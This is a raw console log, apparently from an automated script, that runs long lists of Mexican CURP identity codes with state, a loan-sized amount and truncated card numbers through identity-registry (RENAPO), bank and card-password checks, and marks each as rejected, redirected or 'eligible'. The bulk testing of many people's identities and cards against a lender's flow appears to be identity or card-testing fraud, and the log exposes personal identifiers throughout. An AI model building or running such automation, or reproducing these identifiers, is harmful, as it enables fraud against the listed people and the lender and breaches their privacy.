[1930] ID:1743717 | AEQA770124HGTRNL01 | $180,000 | GUANAJUATO | T:8540... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1931] ID:1767243 | CUHO710810HNLRRS09 | $180,000 | NUEVO LEON | T:1733... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.4s)
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.4s)
[1932] ID:1808431 | VEUR690224HDFGRF07 | $180,000 | CIUDAD DE ME | T:1315... [1933] ID:1821990 | QUFH720131HNLNLC00 | $180,000 | NUEVO LEON | T:8957... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8540 para ID:1743717 ($180,000)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE1002) (12.2s)
[1934] ID:1857190 | MUVJ700501HMCNNN00 | $180,000 | ESTADO DE ME | T:4327... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1935] ID:1867100 | CAZM750501MJCRPN07 | $180,000 | JALISCO | T:7996... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (18.0s)
[1936] ID:1903668 | GARI691118HTSMBS07 | $180,000 | TAMAULIPAS | T:1815... [🔴 OFF] Rechazo bancario (PE170) (12.8s)
[1937] ID:1929930 | VALP781006MJCLPT00 | $180,000 | JALISCO | T:4556... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.5s)
[1938] ID:1980378 | VERA700613MMCLVN03 | $180,000 | ESTADO DE ME | T:7035... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4556 para ID:1929930 ($180,000)... [1939] ID:2057053 | AARR721020HGTFDG03 | $180,000 | GUANAJUATO | T:2030... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.2s)
[1940] ID:2057666 | BARA711216HCHRCL02 | $180,000 | CHIHUAHUA | T:9823... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[1941] ID:2130110 | GOHA690502MDFNRL04 | $180,000 | CIUDAD DE ME | T:8125... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7035 para ID:1980378 ($180,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (17.4s)
[1942] ID:2149453 | BAMS810922HJCNNR01 | $180,000 | JALISCO | T:1356... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[1943] ID:2288817 | VIVR750427MMNRZC08 | $180,000 | MICHOACAN | T:1751... [1944] ID:2322041 | BOCA750129HNLLSL03 | $180,000 | NUEVO LEON | T:4456... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2030 para ID:2057053 ($180,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[1945] ID:2369297 | HEVF780312HJCRZR07 | $180,000 | JALISCO | T:5643... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[1946] ID:2379072 | CASH751120HCGBNC00 | $180,000 | COAHUILA | T:3419... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8125 para ID:2130110 ($180,000)... [🔴 OFF] Rechazo bancario (PE160) (11.4s)
[1947] ID:2435448 | VAMM751219HGTZRR00 | $180,000 | GUANAJUATO | T:5407... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1948] ID:2500596 | JISM700817HJCMDG08 | $180,000 | JALISCO | T:0713... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.7s)
[1949] ID:2521995 | MAPM740824MGTRTG08 | $180,000 | GUANAJUATO | T:7466... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.2s)
[1950] ID:2566635 | SOCG710717HNLTPR09 | $180,000 | NUEVO LEON | T:0798... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.6s)
[1951] ID:2667318 | CONR690214HJCRRC03 | $180,000 | JALISCO | T:6064... [🔴 OFF] Rechazo bancario (PE170) (13.1s)
[1952] ID:2789818 | HEVF780312HJCRZR07 | $180,000 | JALISCO | T:5598... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)
[1953] ID:2932499 | ROTC710628HMCDRR09 | $180,000 | ESTADO DE ME | T:4155... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6064 para ID:2667318 ($180,000)... [🔴 OFF] Rechazo bancario (PE160) (11.0s)
[1954] ID:2935446 | ZAHL690420HMCMRS09 | $180,000 | ESTADO DE ME | T:5827... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.1s)
[1955] ID:2948112 | AULS720912MMNGRN02 | $180,000 | MICHOACAN | T:3768... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.4s)
[1956] ID:2973111 | CABM711028HJCHRR01 | $180,000 | JALISCO | T:1587... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[1957] ID:2987605 | GUPB691127HBCTRN01 | $180,000 | BAJA CALIFOR | T:7803... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.9s)
[1958] ID:3004768 | HEAO710210MSORRF02 | $180,000 | SINALOA | T:0441... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7803 para ID:2987605 ($180,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.7s)
[1959] ID:3050420 | AAML730622HDFYDS01 | $180,000 | CIUDAD DE ME | T:4343... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[1960] ID:3119719 | LPGU690721HJCRRS02 | $180,000 | JALISCO | T:6011... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1961] ID:3174976 | GOHI700726MDFNRR08 | $180,000 | CIUDAD DE ME | T:0976... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (12.1s)
[1962] ID:3289215 | CORP760108HBCHBT08 | $180,000 | BAJA CALIFOR | T:3285... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[1963] ID:3354922 | TUGD731111HMCRNN00 | $180,000 | ESTADO DE ME | T:1251... [🔴 OFF] Contacto preexistente (/confirm-contact) (11.7s)
[1964] ID:3472315 | SASE751119HJCNRD00 | $180,000 | JALISCO | T:7406... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1965] ID:3511408 | GAGD721230HNLRRV02 | $180,000 | NUEVO LEON | T:4517... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.1s)
[1966] ID:3621822 | DIRK691017MDFZMR07 | $180,000 | CIUDAD DE ME | T:2738... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7406 para ID:3472315 ($180,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)
[1967] ID:3622519 | HAPL690712MDFNRL00 | $180,000 | CIUDAD DE ME | T:2598... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.1s)
[1968] ID:3668638 | BAPD720507MGRRDS04 | $180,000 | GUERRERO | T:0319... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4517 para ID:3511408 ($180,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.4s)
[1969] ID:3783726 | MOAS710817HQTYRL07 | $180,000 | QUERETARO | T:3684... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.8s)
[1970] ID:3794039 | CALJ730405HVRSPS03 | $180,000 | VERACRUZ | T:8426... [🔴 OFF] Contacto preexistente (/confirm-contact) (17.4s)
[1971] ID:3794199 | LIBR770503HVRMRD00 | $180,000 | VERACRUZ | T:9927... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2738 para ID:3621822 ($180,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1972] ID:3829673 | SASG730727HCGLRL01 | $180,000 | COAHUILA | T:2669... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[1973] ID:3848402 | COAL711009MTSRLL03 | $180,000 | TAMAULIPAS | T:3756... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[1974] ID:3852911 | OIVR771122HSOLLG06 | $180,000 | SONORA | T:3427... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2598 para ID:3622519 ($180,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1975] ID:3959890 | RIRM751015HSOVDN02 | $180,000 | SONORA | T:1629... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.0s)
[1976] ID:3968144 | MEGR701229MMNRRT07 | $180,000 | MICHOACAN | T:3833... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[1977] ID:4041953 | PEEJ801208HJCRSN01 | $180,000 | JALISCO | T:0297... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3684 para ID:3783726 ($180,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.1s)
[1978] ID:4183963 | NOCC791103MCCRRT00 | $180,000 | CAMPECHE | T:5037... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)
[1979] ID:4191405 | AALD720316HYCLPV00 | $180,000 | YUCATAN | T:4331... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[1980] ID:4263524 | COOO770318HJCNSM02 | $180,000 | JALISCO | T:9249... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3833 para ID:3968144 ($180,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1981] ID:4270927 | SAPR750717HDFNLC07 | $180,000 | CIUDAD DE ME | T:2808... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0297 para ID:4041953 ($180,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.1s)
[1982] ID:4327452 | AAMS691217MNLRRN01 | $180,000 | NUEVO LEON | T:7330... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (17.5s)
[1983] ID:4349210 | GASB701105MNLRRL09 | $180,000 | NUEVO LEON | T:7760... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2808 para ID:4270927 ($180,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.5s)
[1984] ID:4357820 | AUMG750802HBCGNR01 | $180,000 | BAJA CALIFOR | T:9842... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.4s)
[1985] ID:4444330 | ROCS751211HNLDLR02 | $180,000 | NUEVO LEON | T:0233... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7330 para ID:4327452 ($180,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[1986] ID:4461430 | LOCR710319HNLZSB08 | $180,000 | NUEVO LEON | T:6041... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[1987] ID:4468392 | COCF761004HMNNSR05 | $180,000 | MICHOACAN | T:2632... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE1002) (11.8s)
[1988] ID:4476474 | CARD731218MDFRYL08 | $180,000 | CIUDAD DE ME | T:2541... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7760 para ID:4349210 ($180,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.1s)
[1989] ID:4499051 | VARA811006MMNLDL07 | $180,000 | MICHOACAN | T:0894... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9842 para ID:4357820 ($180,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.8s)
[1990] ID:4500206 | MAOA690617MNLRLN08 | $180,000 | NUEVO LEON | T:4124... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[1991] ID:4557832 | FIMM700904MMCGRR01 | $180,000 | ESTADO DE ME | T:1941... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.3s)
[1992] ID:4668362 | AIAH721112HCGVPG06 | $180,000 | COAHUILA | T:2826... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1993] ID:4691755 | AUMD740328MMCGRR03 | $180,000 | ESTADO DE ME | T:6170... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1994] ID:4713369 | GOOE690929HGTMRG08 | $180,000 | GUANAJUATO | T:3093... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2632 para ID:4468392 ($180,000)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.9s)
[1995] ID:4807374 | VAAO760612HMCLRS03 | $180,000 | ESTADO DE ME | T:4358... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6170 para ID:4691755 ($180,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.4s)
[1996] ID:3683032 | TOLM700610HTSRRR09 | $179,980 | TAMAULIPAS | T:8306... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)
[1997] ID:4598798 | DUBJ711112HMNRRS09 | $179,980 | MICHOACAN | T:5300... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4358 para ID:4807374 ($180,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.5s)
[1998] ID:1264954 | BAPA710505HCMLTN09 | $179,960 | COLIMA | T:0149... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.6s)
[1999] ID:2030772 | LAGA690109HDFDRN00 | $179,950 | CIUDAD DE ME | T:0455... [🔴 OFF] Rechazo bancario (PE170) (11.9s)
[2000] ID:2463063 | JAJM690126HMNMMG04 | $179,940 | MICHOACAN | T:8196... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.1s)
[2001] ID:2793487 | GAAR720825HSORMN09 | $179,940 | SONORA | T:0211... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.4s)
[2002] ID:178849 | PEHA741104HNLNNR09 | $179,900 | NUEVO LEON | T:0421... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2003] ID:2881633 | REJE690303HNLBMM01 | $179,890 | NUEVO LEON | T:2047... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2004] ID:4140712 | ROZE720224MMNDMD03 | $179,880 | MICHOACAN | T:4022... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.1s)
[2005] ID:859825 | SATR690521HCGLXF01 | $179,870 | COAHUILA | T:3223... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.5s)
[2006] ID:3900569 | PEGL781007MDFRRR03 | $179,870 | CIUDAD DE ME | T:3160... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.0s)
[2007] ID:1354034 | MACE710503MNLRRL01 | $179,840 | NUEVO LEON | T:1835... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[2008] ID:2695009 | RACN750502HCMMSR01 | $179,800 | COLIMA | T:3422... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2009] ID:3101188 | SARR740130HCPLSB09 | $179,770 | CAMPECHE | T:4094... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2010] ID:2006446 | RILS720703MCHVNS00 | $179,690 | CHIHUAHUA | T:2290... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.0s)
[2011] ID:924047 | PEAC730520MSORBL06 | $179,680 | SINALOA | T:7283... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2012] ID:1379349 | FAFA760716HHGBLL00 | $179,680 | HIDALGO | T:5838... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2013] ID:3223360 | MUPR690513MJCRRS08 | $179,680 | JALISCO | T:2911... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2014] ID:3899621 | VAOO730531HSLLSN03 | $179,660 | SINALOA | T:6548... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.2s)
[2015] ID:1727524 | AAMJ720504HBSYZR08 | $179,630 | BAJA CALIFOR | T:9330... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.9s)
[2016] ID:282731 | PETG690924HQTRWR07 | $179,620 | QUERETARO | T:5127... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.0s)
[2017] ID:3448373 | CEAJ751017HMSRMR07 | $179,620 | MORELOS | T:7001... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.7s)
[2018] ID:4093072 | OIRG700402MJCRMR03 | $179,620 | JALISCO | T:2197... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2019] ID:4819381 | BUTC700528MTSSRR09 | $179,620 | TAMAULIPAS | T:4609... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.1s)
[2020] ID:3108498 | MOMC700107HCGRVS04 | $179,600 | COAHUILA | T:3704... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2197 para ID:4093072 ($179,620)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.3s)
[2021] ID:3471210 | AUGM690913HYCGMN00 | $179,600 | YUCATAN | T:3212... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2022] ID:362060 | CALM740602MMCNMR05 | $179,550 | ESTADO DE ME | T:0658... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2023] ID:1705589 | AEMA710403HDFRRL06 | $179,550 | CIUDAD DE ME | T:7591... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2024] ID:3604739 | GOMA740326MDFNRN05 | $179,540 | CIUDAD DE ME | T:4685... [🔴 OFF] Contacto preexistente (/confirm-contact) (18.0s)
[2025] ID:4318814 | MAVR700305HNLYLN05 | $179,520 | NUEVO LEON | T:4028... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[2026] ID:1442125 | EIEY801115MTSSSL09 | $179,470 | TAMAULIPAS | T:8577... [🔴 OFF] Contacto preexistente (/confirm-contact) (17.6s)
[2027] ID:1311648 | COZA701109HDFSRL04 | $179,450 | CIUDAD DE ME | T:2736... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[2028] ID:3984757 | BOAM720526HMCRLN09 | $179,450 | ESTADO DE ME | T:6021... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.2s)
[2029] ID:4290064 | SAVP790227HGTNZT09 | $179,430 | GUANAJUATO | T:2168... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2030] ID:32111 | ROLC740620MBSSML06 | $179,420 | BAJA CALIFOR | T:9705... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[2031] ID:462156 | SAFK780430MNLLNR08 | $179,400 | NUEVO LEON | T:5672... [2032] ID:3494595 | GUFJ751225MSOTLS08 | $179,390 | SONORA | T:4616... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[2033] ID:1651845 | GURA790519HYCLDN07 | $179,370 | YUCATAN | T:2547... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2034] ID:223521 | SUGD820923MQRRTN04 | $179,350 | QUINTANA ROO | T:5812... [🔴 OFF] Rechazo bancario (PE1002) (11.6s)
[2035] ID:2562819 | RUMJ760514HPLZMS06 | $179,340 | PUEBLA | T:2683... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[2036] ID:3454588 | RIGG731012MSPVRB07 | $179,330 | SAN LUIS POT | T:6817... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.6s)
[2037] ID:2960570 | MEGR701229MMNRRT07 | $179,280 | MICHOACAN | T:3113... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.4s)
[2038] ID:349799 | LOLY710209MQTPRL02 | $179,220 | QUERETARO | T:0096... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.3s)
[2039] ID:213442 | OHEA720201HDFRRM07 | $179,190 | CIUDAD DE ME | T:3083... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3113 para ID:2960570 ($179,280)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.2s)
[2040] ID:2995511 | GUGE741217HDFZND04 | $179,190 | CIUDAD DE ME | T:6690... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2041] ID:14772 | VAVL780903HDFLLS06 | $179,100 | CIUDAD DE ME | T:3954... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE160) (10.7s)
[2042] ID:1723851 | ZAGD691231HNLMNN03 | $179,040 | NUEVO LEON | T:4727... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.3s)
[2043] ID:2639005 | AASR710826HJCLNC09 | $179,040 | JALISCO | T:0737... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2044] ID:4011771 | GACL720813HNLRNS04 | $179,020 | NUEVO LEON | T:9414... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.5s)
[2045] ID:3601437 | GALC700522HJCRPR06 | $179,010 | JALISCO | T:7581... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.8s)
[2046] ID:236030 | COHA690307HMCRRR02 | $179,000 | ESTADO DE ME | T:2845... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[2047] ID:506009 | LOAS710615HSPPLL08 | $179,000 | SAN LUIS POT | T:7807... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7581 para ID:3601437 ($179,010)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2048] ID:526978 | SAGJ701216HCGNNS01 | $179,000 | COAHUILA | T:3340... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[2049] ID:612864 | LOHJ750219HMCPRN01 | $179,000 | ESTADO DE ME | T:5435... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2050] ID:641306 | LIMD690912MDFCRL09 | $179,000 | CIUDAD DE ME | T:6716... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2051] ID:763736 | BUVS700718HMNCLN00 | $179,000 | MICHOACAN | T:0784... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[2052] ID:1181214 | CICJ741031HNLSBS01 | $179,000 | NUEVO LEON | T:2734... [🔴 OFF] Rechazo bancario (PE1002) (15.1s)
[2053] ID:1193123 | VIRC741027HDFLNR07 | $179,000 | CIUDAD DE ME | T:1240... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (17.1s)
[2054] ID:1327805 | AALJ720618HNLBRS00 | $179,000 | NUEVO LEON | T:1712... [🔴 OFF] Contacto preexistente (/confirm-contact) (17.6s)
[2055] ID:1335925 | AERP690629MVRRMT00 | $179,000 | VERACRUZ | T:0112... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.3s)
[2056] ID:1400480 | CAHA710104MCMBRL02 | $179,000 | COLIMA | T:1233... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1712 para ID:1327805 ($179,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[2057] ID:1523973 | RIFA730703HCMVRN06 | $179,000 | COLIMA | T:3267... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (12.9s)
[2058] ID:2093186 | HEFO770722HNLRGZ02 | $179,000 | NUEVO LEON | T:3418... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.2s)
[2059] ID:2129302 | SAAE790908MCPNCR09 | $179,000 | CAMPECHE | T:9425... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[2060] ID:2245315 | CAVL700621HMSSGS04 | $179,000 | MORELOS | T:4919... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.9s)
[2061] ID:2282973 | SATF710724MQTNLB02 | $179,000 | QUERETARO | T:1842... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.5s)
[2062] ID:2366026 | CAMR741213HDFRNF07 | $179,000 | CIUDAD DE ME | T:9146... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.9s)
[2063] ID:2588230 | SAGM770707HMCNRC08 | $179,000 | ESTADO DE ME | T:2526... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2064] ID:2601939 | VENM720204HBSLVN07 | $179,000 | BAJA CALIFOR | T:3310... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2065] ID:2633086 | GUDF760424HDFTVR07 | $179,000 | CIUDAD DE ME | T:0142... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2066] ID:2820957 | SEMM720310MTSGRR05 | $179,000 | TAMAULIPAS | T:6449... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[2067] ID:2861450 | SAOM771108HVRNRG01 | $179,000 | VERACRUZ | T:9482... [🔴 OFF] Contacto preexistente (/confirm-contact) (18.6s)
[2068] ID:2892815 | AUMG710803HDFGNR02 | $179,000 | CIUDAD DE ME | T:8819... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[2069] ID:2937497 | VIGJ690906HCPLTN03 | $179,000 | CAMPECHE | T:8397... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (9.2s)
[2070] ID:3085350 | PIGM740728HPLMMG01 | $179,000 | PUEBLA | T:1840... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.9s)
[2071] ID:3484220 | AILD731103HJCRMR03 | $179,000 | JALISCO | T:3593... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[2072] ID:3896693 | VEGF811116HMCNLD03 | $179,000 | ESTADO DE ME | T:2692... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2073] ID:4273227 | SOPL770303HJCLLS06 | $179,000 | JALISCO | T:0769... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2074] ID:4331594 | GOGE710208HJCBRD09 | $179,000 | JALISCO | T:5358... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2075] ID:4387703 | AANM690806HMCLGR04 | $179,000 | ESTADO DE ME | T:4702... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2076] ID:4612787 | SACL741211HTSNRS04 | $179,000 | TAMAULIPAS | T:1957... [🔴 OFF] Rechazo bancario (PE170) (18.2s)
[2077] ID:4855166 | DATC740323HNLNRS09 | $179,000 | NUEVO LEON | T:3234... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
